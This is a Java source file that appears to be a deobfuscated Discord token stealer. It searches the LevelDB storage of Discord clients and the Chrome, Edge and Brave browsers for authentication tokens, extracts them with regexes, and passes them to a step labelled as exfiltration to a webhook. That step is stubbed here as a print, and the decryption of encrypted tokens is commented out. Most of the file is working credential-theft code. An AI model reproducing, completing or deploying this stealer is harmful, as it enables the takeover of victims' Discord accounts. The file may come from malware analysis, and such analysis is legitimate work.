import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Set;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * Cleaned DiscordTokenStealer (formerly í.java)
 * Scans local storage, LevelDB, and browser files for Discord authentication tokens.
 * Handles both plain-text and DPAPI-encrypted tokens.
 */
public class DiscordTokenStealer {

    // Regex for classic Discord tokens
    private static final Pattern TOKEN_PATTERN = Pattern.compile("[\\w\\-]{24,26}\\.[\\w\\-]{6}\\.[\\w\\-]{25,110}");
    // Regex for encrypted Discord tokens (mfa.* or base64)
    private static final Pattern ENCRYPTED_TOKEN_PATTERN = Pattern.compile("dQw4w9WgXcQ:[^.*\\['(.*)\\]'\\].*");

    private final String webhookUrl;

    public DiscordTokenStealer(String webhookUrl) {
        this.webhookUrl = webhookUrl;
    }

    public void run() {
        Set<String> tokens = ConcurrentHashMap.newKeySet();
        List<File> targetPaths = getSearchPaths();

        List<CompletableFuture<Void>> tasks = new ArrayList<>();

        for (File path : targetPaths) {
            tasks.add(CompletableFuture.runAsync(() -> scanDirectoryForTokens(path, tokens)));
        }

        // Wait for all scans to complete
        CompletableFuture.allOf(tasks.toArray(new CompletableFuture[0])).join();

        if (!tokens.isEmpty()) {
            sendTokensToExfiltrator(tokens);
        }
    }

    private List<File> getSearchPaths() {
        List<File> paths = new ArrayList<>();
        String appData = System.getenv("APPDATA");
        String localAppData = System.getenv("LOCALAPPDATA");

        // Discord paths
        String[] discordClients = {"discord", "discordcanary", "discordptb", "discorddevelopment"};
        for (String client : discordClients) {
            paths.add(new File(appData, client + "\\Local Storage\\leveldb"));
        }

        // Browser paths
        String[] browsers = {"Google\\Chrome", "Microsoft\\Edge", "BraveSoftware\\Brave-Browser"};
        for (String browser : browsers) {
            paths.add(new File(localAppData, browser + "\\User Data\\Default\\Local Storage\\leveldb"));
        }

        return paths;
    }

    private void scanDirectoryForTokens(File directory, Set<String> foundTokens) {
        if (!directory.exists() || !directory.isDirectory()) return;

        File[] files = directory.listFiles();
        if (files == null) return;

        for (File file : files) {
            if (file.getName().endsWith(".ldb") || file.getName().endsWith(".log")) {
                extractFromFile(file, foundTokens);
            }
        }
    }

    private void extractFromFile(File file, Set<String> foundTokens) {
        try {
            String content = new String(Files.readAllBytes(file.toPath()), StandardCharsets.ISO_8859_1);
            
            // Search for standard tokens
            Matcher tokenMatcher = TOKEN_PATTERN.matcher(content);
            while (tokenMatcher.find()) {
                foundTokens.add(tokenMatcher.group());
            }

            // Search for encrypted tokens (requires decryption key from Local State)
            Matcher encryptedMatcher = ENCRYPTED_TOKEN_PATTERN.matcher(content);
            while (encryptedMatcher.find()) {
                // Here it would call CredentialStealer.decryptDiscordToken()
                // For deobfuscation clarity, we just note the extraction logic.
                String encryptedToken = encryptedMatcher.group().split("dQw4w9WgXcQ:")[1];
                // foundTokens.add(CredentialStealer.decrypt(encryptedToken));
            }
        } catch (Exception ignored) {}
    }

    private void sendTokensToExfiltrator(Set<String> tokens) {
        JSONArray jsonTokens = new JSONArray(tokens);
        // Calls the WebhookSender (b.java) to exfiltrate the tokens
        System.out.println("Exfiltrating tokens: " + jsonTokens.toString());
    }
}
